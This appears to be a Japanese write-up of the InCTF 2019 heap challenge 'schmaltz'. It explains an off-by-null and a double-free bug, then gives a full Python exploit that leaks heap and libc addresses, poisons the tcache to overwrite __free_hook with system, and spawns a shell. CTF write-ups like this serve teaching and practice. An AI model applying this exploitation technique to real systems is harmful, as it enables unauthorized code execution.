# [pwn 804pts] schmaltz - InCTF 2019
64ビットでPIE以外有効です。
```
$ checksec -f schmaltz
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols     Yes      0               4       schmaltz
```
ヒープ問です。ノートのサイズは0x200までで、最大7個まで作れます。構造体は次のようになっていて、bssセクションに配列として存在します。
```c
typedef struct {
  char *note;
  int size;
  char is_used;
} Note;
```
入力を受けた後にbuf[size] = 0するのでoff-by-nullが存在します。
free時にis_usedを0にしますが、free処理でこれは確認していないのでdouble freeがあります。
さらに、インデックスのチェックがないのでshowやdeleteで配列の先頭を基点として任意の箇所をNote構造体として認識させらそうですが、指定するインデックスはnote_ctrより小さくなければなりません。

さて、libc-2.28なので単純にdouble freeはできませんが、off-by-nullを使えば別サイズのtcacheに放り込むことができそうです。（picoCTFで同じ問題を見た気がする。）

```python
from ptrlib import *

def add(size, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", str(size))
    if size > 0:
        sock.sendafter("> ", data)
    return

def view(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", str(index))
    sock.recvuntil("Content: ")
    return sock.recvline()

def delete(index):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", str(index))
    return

def offset(address):
    assert address % 0x10 == 0
    return (address - 0x602060) // 0x10

libc = ELF("./libc.so.6")
elf = ELF("./schmaltz")
sock = Process(["./schmaltz"], env={"LD_LIBRARY_PATH": "./"})
#sock = Socket("52.23.219.15", 1337)
libc_main_arena = 0x3b0c40
magic01 = 0x105ae0
one_gadget = 0x41aca

# leak heap address
add(0x28, "A") # 0
add(0x28, "B") # 1
delete(1)
delete(0)
add(0x28, "\x60") # 0
addr_heap = u64(view(0))
logger.info("addr_heap = " + hex(addr_heap))
delete(0)

# leak libc address
add(0x38, "0") # 0
add(0x108, "A") # 1
delete(0)
delete(1)
add(0x38, b'0' * 0x38) # 0
delete(1)
add(0xf8, p64(addr_heap + 0xc0) + p64(0)*2 + p64(0x431)) # 0
add(0x108, "A") # 1
add(0x108, "target") # 2
add(0x1e0, "X" * 0x1df) # 3
add(0x1e0, (p64(0) + p64(0x21)) * 0x1d) # 4
delete(3)
delete(4)
add(0x48, "1" * 0x40) # 3: prepare for next
add(0x200, "B") # 4
delete(4)
delete(3)
delete(2) # link to unsorted bin
delete(0)
add(0x38, "\x90") # 0
libc_base = u64(view(1)) - libc_main_arena - 1104
logger.info("libc = " + hex(libc_base))

# tcache poisoning
add(0x48, "X" * 0x40) # 2
add(0x28, "count up")
delete(4)
add(0x1f8, p64(libc_base + libc.symbol("__free_hook")))
add(0x200, "/bin/sh")
add(0x200, p64(libc_base + libc.symbol("system")))

# get the shell!
delete(3)

sock.interactive()
```

# 感想
問題は面白いけどこれサーバー側ldで動かしてるってことだよね？何がしたいのかよく分からん。
